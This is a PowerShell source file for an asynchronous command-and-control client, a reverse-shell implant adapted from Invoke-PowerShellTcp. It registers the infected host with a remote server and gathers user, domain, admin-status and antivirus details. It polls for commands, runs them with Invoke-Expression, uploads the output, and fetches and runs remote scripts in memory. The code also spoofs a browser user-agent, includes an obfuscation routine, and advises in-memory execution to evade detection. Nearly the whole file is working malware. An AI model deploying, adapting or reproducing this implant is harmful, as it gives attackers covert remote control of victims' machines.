<#
async shell client

Code derived from Invoke-PowerShellTcp, written
by Nikhil "SamratAshok" Mittal ( GPLv3 ).

It has since been heavliy modified, the direct tcp socket communication was scrapped in favor of HTTP/S request 
communication to the cgi app. This was done to make communication asynchronous which should persist over sporatic 
internet connections. It goes to sleep when it cannot contact the server and makes periodic checks every 5 minutes.

It works over https and has the ability to ignore cert checking, this was done for compatibility with self-signed 
certificates (use caution!). The code is self contained without one needing to pass any parameters, just the the 
web server ip hosting this script in the IEX.

The changes were made to help make proxing of communication easier. Insure this file is only executed in memory 
via iex to decrease the likelihood of detection.

xor-function
#>



# Set ip address or domain hosting the null-shell cgi app.
$uri = 'https://192.168.0.15/the-generated-cgi-filename-here <'

# set the key that matches the one set on the cgi handler inside single quotes
$key = '> place random key generated from installer here <'

# place your ssl key fingerprint here to perform manual key validation
$certfingerprint = '> place ssl finger/thumb print here <'

# user-agent used by different functions, change this to avoid signatures
$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"



function send-request { 

	param($request)
	
	# This turns off https cert checking in order to work with Self Signed Certificates. 
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

       	$webclient = New-Object System.Net.WebClient
	$webclient.headers.add("User-Agent", $agent)
       	$encstring = $webclient.Downloadstring($request)

	# command below turns https cert checking back on
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }

	$string = base64string-decode $encstring

	return $string

}

function check-certprint { 

	param($urlTocheck)

        # This turns off https cert checking in order to work with Self Signed Certificates.
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

	$millisecs = 5000
	$req = [Net.HttpWebRequest]::Create($urlTocheck)
	$req.UserAgent = $agent
	$req.Timeout = $millisecs

	# pipe getresponse response to close connection prevents lock ups
	$response = $req.GetResponse()
	$response.close()
	
	$keyfingerprint = $req.ServicePoint.Certificate.GetCertHashString()

        # command below turns https cert checking back on
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }
 
	return $keyfingerprint

}

function decide-sendRequest { 

	param($request)

        $keyprint = check-certprint $uri
        if ( "$keyprint" -eq "$certfingerprint" )  { $cmdString = send-request $request } else { throw "CERT CHECK FAILED!" }

	# Uncomment the below to debug
	# write-host server thumbprint [ $keyprint ]
	# write-host client thumbprint [ $certfingerprint ]

	return $cmdString

} 

function set-sysname {

        # register machine to server

                # Some optional markers listed for reference...
                # $biosversion = gwmi win32_bios | select -expand SMBIOSBIOSVersion
                # $serial = gwmi win32_bios | select -expand SerialNumber

        $rawmac = ((gwmi win32_networkadapter -Filter "AdapterType LIKE 'Ethernet 802.3'") | select -expand macaddress )
        $mac = $rawmac -replace "\W", '-'

        $name = $env:computername
						    # Example date Feb 7 at 9:32:05 pm 
	$regtime = get-date -uformat "%m%d%H%M%S"   # The time format is [month 02 | day 07 | hour 21 | minute 32 | second 05] [0207213205]

        $sysname = $name + "-" + $mac + "-" + $regtime

	return $sysname
}

function get-info  {

        $domain = $env:UserDomain
        $LogOnServer = $env:LogOnServer
        $userName = $env:UserName
        $machineName = $env:ComputerName

        $OS = (gwmi Win32_OperatingSystem).caption
        $SysDescription = (gwmi Win32_OperatingSystem).description
        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        $PsVersion = $PSVersionTable.PSVersion.Major

	# Create table of AV software
	$avServices = @{"symantec" = "Symantec"; 
		"navapsvc" = "Norton";
		"mcshield" = "McAfee"; 
		"windefend" = "Windows Defender";
		"savservice" = "Sophos";
		"avp" = "Kaspersky";
		"SBAMSvc" = "Vipre";
		"avast!" = "Avast";
		"fsma" = "F-Secure";
		"antivirservice" = "AntiVir";
		"avguard" = "Avira";
		"fpavserver" = "F-Protect";
		"pshost" = "Panda Security";
		"pavsrv" = "Panda AntiVirus";
		"bdss" = "BitDefender";
		"avkproxy" = "G_Data AntiVirus";
		"klblmain" = "Kaspersky Lab AntiVirus";
		"vbservprof" = "Symantec VirusBlast";
		"ekrn" = "ESET";
		"abmainsv" = "ArcaBit/ArcaVir";
		"ikarus-guardx" = "IKARUS";
		"clamav" = "ClamAV";
		"aveservice" = "Avast";
		"immunetprotect" = "Immunet";
		"msmpsvc" = "Microsoft Security Essentials";
		"msmpeng" = "Microsoft Security Essentials";
	}
	
	# generate summary of client
        $summary  = "============[ System Summary ]==============`n"
        $summary += "Domain       : $domain`n"
        $summary += "LogOn Server : $LogOnServer`n"
        $summary += "User Name    : $userName`n"
        $summary += "ComputerName : $machineName`n"
        $summary += "Admin        : $IsAdmin`n"
	$summary += "PS version   : $PsVersion`n"
        $summary += "OS version   : $OS`n"
	$summary += "Description  : $SysDescription`n"
	$summary += "======[ Detected Antivirus Services ]=======`n"

	# get current services
	$services = (gwmi win32_service).name

	foreach ($S in $avServices.GetEnumerator()) {			
		if ( $services -match $($S.Name) ) { $summary += "$($S.Name): $($S.Value)`n" }
	}

	write-output $summary	

}

function exec-script {

        param($scriptName)

        if ($scriptName ) {
        # send name of powershell script to retrive from C&C server then execute.

		$encScriptName = base64url-encode $scriptName

                $getScript = $uri + "?auth=" + $enckey + "&ld=" + $encScriptName
		$string = decide-sendRequest $getScript

                if ( $string -match '404' ) { write-output = '[!] script not avaliable on your control server!' } 
		else {

			iex -command $string 
                        if ($?) { write-output "[+] ps code executed!" } 
			 else { write-output "[!] something went wrong! load failed!" } 
                }

        } else { write-output "[!] You need to specify the name of script! EX: load-script NameOfScript" }

}

function base64url-encode {

	param($rawstring)

	# Striping unsafe characters from url, also escaping the plus sign
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($rawstring))
	$rmequal = $encstring -replace '=', '!'
	$rmslash = $rmequal -replace '/', '_'
	$rmplus  = $rmslash -replace '\+', '-'

	$encurl = $rmplus

	return $encurl
}

# encode a string with base64 to prep for obfuscation do not use this for encoded commands since UTF8
function base64string-encode {

        param($string)

        # Use this to encode strings to base64 format
        $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

        return $encoded
}

function base64string-decode {

        param($encstring)

        # Don't have to worry about unsafe url characters since it's content not a url string
        $decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

        return $decstring
}

function gen-key {
        $rs = New-Object System.Random
        1..40 | % { $key += [Char]$rs.next(97,122) }
        $kstring = [string]::join("", ($key))
        return $kstring
}

# Generate a PowerShell format base64 encoded command
# place your command in strong quotes or read it from a file as a string
function gen-enccmd {

        param($clrcmd)

        $bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString())
        $enccmd = [Convert]::ToBase64String($bytescmd)

        return $enccmd
}

# decodes a PowerShell formatted encoded command
function dec-enccmd {

        param($enccmd)
        
        $cmdString = [System.Text.Encoding]::Unicode.getString([System.Convert]::Frombase64String($enccmd))

        return $cmdString

}

# action = hide or clear
# key = encrpytion or decryption string
# string = base64 string to either be encrypted or decrypted

function obfuscate-base64($action, $key, $string) {

        $alpha = @{ "1" = "A";
                    "2" = "B";
                    "3" = "C";
                    "4" = "D";
                    "5" = "E";
                    "6" = "F";
                    "7" = "G";
                    "8" = "H";
                    "9" = "I";
                    "10" = "J";
                    "11" = "K";
                    "12" = "L";
                    "13" = "M";
                    "14" = "N";
                    "15" = "O";
                    "16" = "P";
                    "17" = "Q";
                    "18" = "R";
                    "19" = "S";
                    "20" = "T";
                    "21" = "U";
                    "22" = "V";
                    "23" = "W";
                    "24" = "X";
                    "25" = "Y";
                    "26" = "Z";
        }

        $inv_alpha = @{}

        # create another hash table like alpha but with inverted values
        foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)}

        $count = 0
        foreach ($ch in $string.GetEnumerator())
        {

                $c = [string]$ch
                if ( $c -match '[a-zA-Z]')
                {

                        $ival = $inv_alpha[$c]
                        $s = $key[$count]

                        if (!$s) { $count = 0; $s = $key[0] }  # reset key to begining

                        # juggling variable formats between integer and string methods
                        $ss = [string]$s
                        $S = $ss.ToUpper()
                        $shift = $inv_alpha[$S]

                        if ($action -match 'hide' )
                             { $val = [int]$ival + [int]$shift }
                        else { $val = [int]$ival - [int]$shift }

                        if ( [int]$val -lt '1'  ) { $val = [int]$val + '26' }
                        if ( [int]$val -gt '26' ) { $val = [int]$val - '26' }

                        # juggling variable formats between integer and string methods
                        $sval = [string]$val
                        $char = $alpha[$sval]
                        $schar = [string]$char

                        if ( $c -cmatch '[a-z]' )
                           { $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) }
                        elseif ( $c -cmatch '[A-Z]' )
                           { $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) }
                        $count++
                } else { $ncipher += [string]::join("", ($c)) }
        }
        
        $scipher = [string]$ncipher
        return $scipher
}

# requires file name and file path if not in the same running directory
function obfuscate {

        param($filePath)

        $test = Test-Path $filePath -IsValid

        If ($test -eq $True)
        {

                $fileString = get-content $filePath | Out-string

                $base64String = base64string-encode $fileString

                $key = gen-key

                $obfuscated = obfuscate-base64 hide $key $base64String
                $obfuscated > 'New-File.txt'

                $report = "[!] Key generated is : $key `n"
                $report += "[!] wrote obfuscated data to New-File.txt!"

                write-output $report

         } else { $report = "[!] File path is not valid!"; write-output $report }


}

function de-obfuscate ( $filePath, $key ) {

        if ($key)
        {

                $test = Test-Path $filePath -IsValid
                if ($test -eq $True)
                {

                        $obfileString = get-content $filePath | Out-string

                        $clearbase64 = obfuscate-base64 clear $key $obfileString
                        $clearString = base64string-decode $clearbase64
                        $clearString > 'File.txt'

                        $report = "[!] wrote de-obfuscated data to File.txt!"

                        write-output $report

                } else { $report = "[!] File path is not valid!"; write-output $report }

        } else { $report = "[!] You need to provide a de-obfuscation key!"; write-output $report }

}

function proc-loop { 

        $hostname = set-sysname
        $enchostname = base64url-encode $hostname
        $enckey = base64url-encode $key
        $enroll = $uri + "?auth=" + $enckey + "&reg=" + $enchostname
	$bucket = decide-sendRequest $enroll
 
      	while (1)
       	{
		try
		{

	   		#Pull command to be executed by this client
       	    		$getcmd = $uri + "?auth=" + $enckey + "&get=" + $enchostname
	    		$cmd = decide-sendRequest $getcmd

			# Ignore running the same command repeatedly, when server is unmanned.
			if ( -not ("$oldcmd" -eq "$cmd")) { 

                		# setting previous encoded command
                     		$oldcmd = $cmd

				if ( "$cmd" -notmatch 'ftp' ) {

                			# Execute the command on the client.
                			$sendback = (Invoke-Expression -Command "$cmd" 2>&1 | Out-String )

				} else { $sendback = 'The windows ftp client is not supported in async mode' } 

				# prep output to be uploaded, encoding not moved into request function.         	
				$encstdout = base64url-encode $sendback

				# Check base64 encoded string length and trim it if too close to url character limit, allow room.
				if ( $encstdout.length -gt 65000 ) { 
					$encstdout = $encstdout.substring(0, [System.Math]::Min(65000, $encstdout.length))
				}

				# Upload the stdout of executed command to server
				$upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
				$bucket = decide-sendRequest $upload

			}

		}

		catch
		{
			# uncomment warnings below for debugging
			# Write-Warning "Something went wrong with execution of command via client."
			# Write-Error $_

                        $x = ($error[0] | Out-String)
                        $error.clear()

			if ( $x -match 'CERT CHECK FAILED!' ) { exit } else { $error = 'COMMAND FAILED!!! Waiting for 60 seconds before checking back in.' }

			$senderror = $error + $x
                	$encstdout = base64url-encode $senderror

                        # Upload the stdout of executed command to server
                        $upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
                        $bucket = decide-sendRequest $upload

			Start-Sleep -s 60

		}

		Start-Sleep -s 5
         }


} 

while (1)
{

	try 
	{ 
		proc-loop 
		
	}
        catch
	{
		# uncomment warnings below for debugging
        	# Write-Warning "Attempting to contact $uri failed do you have the null-shell cgi set up?, will retry."
        	# Write-Error $_
    		Start-Sleep -s 300
	}

}
